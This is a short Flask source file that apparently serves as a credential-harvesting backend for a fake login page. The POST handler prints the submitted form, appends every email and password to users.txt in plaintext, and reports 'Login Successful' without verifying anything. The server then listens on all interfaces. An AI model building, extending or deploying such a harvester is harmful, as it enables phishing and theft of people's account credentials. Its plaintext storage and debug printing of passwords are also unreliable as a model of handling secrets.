from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

if not os.path.exists("users.txt"):
    open("users.txt","w").close()

@app.route("/", methods=["GET","POST"])
def login():

    if request.method == "POST":

        print(request.form)   # DEBUG

        email = request.form.get("email")
        password = request.form.get("password")

        with open("users.txt","a") as f:
            f.write(f"{email},{password}\n")

        return redirect("/dashboard")

    return render_template("login.html")


@app.route("/dashboard")
def dashboard():
    return "<h1>Login Successful</h1>"


app.run(host="0.0.0.0", port=10000)
